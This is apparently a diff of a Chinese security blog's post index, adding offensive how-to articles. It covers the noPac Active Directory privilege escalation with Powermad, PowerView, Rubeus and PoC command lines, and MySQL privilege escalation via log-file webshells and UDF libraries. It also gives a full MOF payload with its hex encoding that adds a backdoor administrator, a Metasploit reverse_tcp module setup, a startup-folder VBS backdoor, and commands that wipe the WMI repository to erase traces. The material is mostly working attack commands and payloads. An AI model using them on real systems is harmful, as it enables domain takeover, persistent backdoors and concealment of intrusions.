+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> syyu <span class="literal">-Domain</span> hacker.me <span class="literal">-DomainController</span> dc.hacker.me <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="2-清除SPN"><a href="#2-清除SPN" class="headerlink" title="2.清除SPN"></a>2.清除SPN</h3></li>
+</ul>
+<blockquote>
+<p>  使用 <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> 下的 <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a> 工具 ，进行清除 </p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="string">&quot;CN=syyu,CN=Computers,DC=hacker,DC=me&quot;</span> <span class="literal">-Clear</span> <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="3-修改sAMAccountName属性"><a href="#3-修改sAMAccountName属性" class="headerlink" title="3.修改sAMAccountName属性"></a>3.修改sAMAccountName属性</h3></li>
+</ul>
+<blockquote>
+<p>   将 <strong>sAMAccountName</strong> 改为域控的机器账号名</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp  // 查询 域控的主机名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // sAMAccountName 改为域控的机器账号名</span><br><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;dc&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="4-请求TGT"><a href="#4-请求TGT" class="headerlink" title="4.请求TGT"></a>4.请求TGT</h3></li>
+</ul>
+<blockquote>
+<p>  使用更改后的机器名申请TGT票据，利用 <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> 完成请求</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:dc /password:p@ssWord /domain:hacker.me /dc:dc.hacker.me /nowrap</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="5-再次修改sAMAccountName属性值"><a href="#5-再次修改sAMAccountName属性值" class="headerlink" title="5.再次修改sAMAccountName属性值"></a>5.再次修改sAMAccountName属性值</h3></li>
+</ul>
+<blockquote>
+<p>  <code>samaccountname</code>重置会原本的用户名或改为其他域内不存在账户</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;syyu$&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="6-获取高权限ST票据"><a href="#6-获取高权限ST票据" class="headerlink" title="6.获取高权限ST票据"></a>6.获取高权限ST票据</h3></li>
+</ul>
+<blockquote>
+<p>  在采用刚刚获取到的<code>TGT</code>进行<code>S4U2self</code>请求来获取域控<code>ST</code>票据（这个过程<code>KDC</code>会去查找<code>samaccountname</code>，由于刚才<code>MachineCount</code>的<code>samaccountname</code>为<code>dc</code>，所以<code>KDC</code>回去查找这个<code>dc</code>，此时由于已经将<code>MachineCount</code>的<code>samaccountname</code>所更改，<code>KDC</code>查找不到<code>dc</code>就会在后面加上<code>$</code>符去寻找，此时找到的就为域控的<code>dc$</code>，并将它的<code>ST</code>票据返回）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot; /altservice:&quot;ldap/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT值]</span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:&quot;CIFS/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT]</span><br></pre></td></tr></table></figure>
+
+<p>此时，我们便获取了<code>DC</code>的<code>ST</code>票据</p>
+<h2 id="poc使用"><a href="#poc使用" class="headerlink" title="poc使用"></a>poc使用</h2><h3 id="sam-the-admin"><a href="#sam-the-admin" class="headerlink" title="sam_the_admin"></a>sam_the_admin</h3><blockquote>
+<p>  <a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sam_the_admin.py <span class="string">&quot;god/liukaifeng01:hongrisec@2021@&quot;</span> -dc-ip 192.168.52.138 -shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="noPac-python"><a href="#noPac-python" class="headerlink" title="noPac_python"></a>noPac_python</h3><blockquote>
+<p>  <a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 noPac.py redteam/saul:<span class="string">&#x27;admin!@#45&#x27;</span> -dc-ip 10.10.10.8 -dc-host owa -shell --impersonate administrator </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/FHLZLHQ/article/details/121964692">https://blog.csdn.net/FHLZLHQ/article/details/121964692</a></p>
+<p><a href="http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
+<p><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p>
+<p><a href="https://sairson.cn/index.php/archives/45/">https://sairson.cn/index.php/archives/45/</a></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p><a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+<p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+<p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
+<p><a href="https://github.com/ricardojba/Invoke-noPac">https://github.com/ricardojba/Invoke-noPac</a></p>
+<h2 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h2><p><a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>漏洞复现</category>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏洞复现</tag>
+        <tag>域提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Redis未授权访问利用方式总结</title>
-    <url>/2021/12/03/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
+    <url>/articles/d81db563/</url>
     <content><![CDATA[<h1 id="Redis未授权访问利用方式总结"><a href="#Redis未授权访问利用方式总结" class="headerlink" title="Redis未授权访问利用方式总结"></a>Redis未授权访问利用方式总结</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方下载地址: <a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></p>
 <p>编译安装, </p>
 <p>或者使用Docker 环境</p>
@@ -276,7 +671,7 @@
   </entry>
   <entry>
     <title>shiro1.2.4反序列化漏洞复现</title>
-    <url>/2021/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <url>/articles/a27657b2/</url>
     <content><![CDATA[<h1 id="shiro-反序列化漏洞复现"><a href="#shiro-反序列化漏洞复现" class="headerlink" title="shiro 反序列化漏洞复现"></a>shiro 反序列化漏洞复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>Apache Shiro 是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为 550 的 issue 中爆出严重的 Java 反序列化漏洞。</p>
 <p>在 Apache Shiro&lt;=1.2.4 版本中 AES 加密时采用的 key 是<strong>硬编码</strong>在代码中的，这就为伪造 cookie 提供了机会。只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞。</p>
 <p>Shiro 的 “记住我” 功能是设置 cookie 中的 rememberMe 值来实现。当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
@@ -462,8 +857,111 @@
       </tags>
   </entry>
   <entry>
+    <title>MySQL提权方式总结</title>
+    <url>/articles/0/</url>
+    <content><![CDATA[<h1 id="MySQL提权方式总结"><a href="#MySQL提权方式总结" class="headerlink" title="MySQL提权方式总结"></a>MySQL提权方式总结</h1><h2 id="os-shell-into-outfile"><a href="#os-shell-into-outfile" class="headerlink" title="os-shell / into outfile"></a>os-shell / into outfile</h2><ul>
+<li>  知道网站物理路径</li>
+<li>  高权限数据库用户</li>
+<li>  load_file() 开启 即 secure_file_priv 无限制</li>
+<li>  网站路径有写入权限</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="日志文件写shell"><a href="#日志文件写shell" class="headerlink" title="日志文件写shell"></a>日志文件写shell</h2><ul>
+<li>  Web 文件夹宽松权限可以写入</li>
+<li>  高权限运行 MySQL 或者 Apache</li>
+</ul>
+<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/c1595d3a029a.log |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>general_log</code> 默认关闭，</p>
+<p>开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
+<p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 更改日志文件位置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看当前配置</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> <span class="keyword">ON</span>                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>info.php <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"></span><br><span class="line"># 往日志里面写入 payload</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 此时已经写到 info.php 文件当中了</span><br><span class="line">root<span class="variable">@c1595d3a029a</span>:<span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>$ cat info.php </span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>mysqld, Version: <span class="number">5.5</span><span class="number">.61</span><span class="number">-0</span>ubuntu0<span class="number">.14</span><span class="number">.04</span><span class="number">.1</span> ((Ubuntu)). started <span class="keyword">with</span>:</span><br><span class="line">Tcp port: <span class="number">3306</span>  Unix socket: <span class="operator">/</span>var<span class="operator">/</span>run<span class="operator">/</span>mysqld<span class="operator">/</span>mysqld.sock</span><br><span class="line"><span class="type">Time</span>                 Id Command    Argument</span><br><span class="line"><span class="number">201031</span> <span class="number">21</span>:<span class="number">14</span>:<span class="number">46</span>       <span class="number">40</span> Query    <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span></span><br><span class="line"><span class="number">201031</span> <span class="number">21</span>:<span class="number">15</span>:<span class="number">34</span>       <span class="number">40</span> Query    <span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><p>假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> host, <span class="keyword">user</span>, password <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure>
+
+<p>或者 存在网页后台 ， 找一下 后台的账号密码</p>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>sqlmap和 msf 均自带 udf提权插件 （sqlmap 的需要解码）</p>
+<p><strong>寻找插件目录</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> plugin_dir    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>mysql<span class="operator">/</span>lib<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h3><p>写入动态链接库可以分为下面几种情形：</p>
+<p>SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:30008/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --file-write=<span class="string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果没有注入的话，我们可以操作原生 SQL 语句，</p>
+<p>这种情况下当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 直接 <span class="keyword">SELECT</span> 查询十六进制写入</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 解码十六进制再写入多此一举</span><br><span class="line"><span class="keyword">SELECT</span> unhex(<span class="string">&#x27;7f454c4602...&#x27;</span>) <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 直接传入路径编码</span><br><span class="line"><span class="keyword">SELECT</span> hex(load_file(<span class="string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));</span><br><span class="line"></span><br><span class="line"># 也可以将路径 hex 编码</span><br><span class="line"><span class="keyword">SELECT</span> hex(load_file(<span class="number">0x2f6c69625f6d7973716c7564665f7379735f36342e736f</span>));</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql &gt; select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的</p>
+<h3 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
+
+<h3 id="UDFshell"><a href="#UDFshell" class="headerlink" title="UDFshell"></a>UDFshell</h3><p>不出网的话， 无法直连MySQL</p>
+<h3 id="UDF-PHP"><a href="#UDF-PHP" class="headerlink" title="UDF.PHP"></a>UDF.PHP</h3><p><a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">t00ls UDF.PHP</a> 简单方便，一键 DUMP UDF 和函数，操作门槛降低了很多：</p>
+<p>或者 使用 Navicat 自带的 tunnel 隧道脚本 ， 类似于 reGeorg</p>
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:/Windows/system32/wbem/mof/目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<p>mof 脚本的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>核心 payload 为：</p>
+<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>MySQL 写文件的特性将这个 MOF 文件导入到 C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 否则出现在 c:/windows/system32/wbem/bad 目录下：</p>
+<h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF-MOF-提权"><a href="#MSF-MOF-提权" class="headerlink" title="MSF MOF 提权"></a>MSF MOF 提权</h3><p>MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="comment"># 设置好自己的 payload</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 10.211.55.21</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
+<h4 id="启动项路径"><a href="#启动项路径" class="headerlink" title="启动项路径"></a>启动项路径</h4><p><strong>Windows Server 2003</strong> 的启动项路径：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 中文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line"><span class="comment"># 英文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开关机项 需要自己建立对应文件夹</span></span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows Server 2008</strong> 的启动项路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Set WshShell=WScript.CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">WshShell.Run <span class="string">&quot;net user hacker P@ssw0rd /add&quot;</span>, 0</span><br><span class="line">WshShell.Run <span class="string">&quot;net localgroup administrators hacker /add&quot;</span>, 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="MySQL-写入启动项"><a href="#MySQL-写入启动项" class="headerlink" title="MySQL 写入启动项"></a>MySQL 写入启动项</h4><p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：</p>
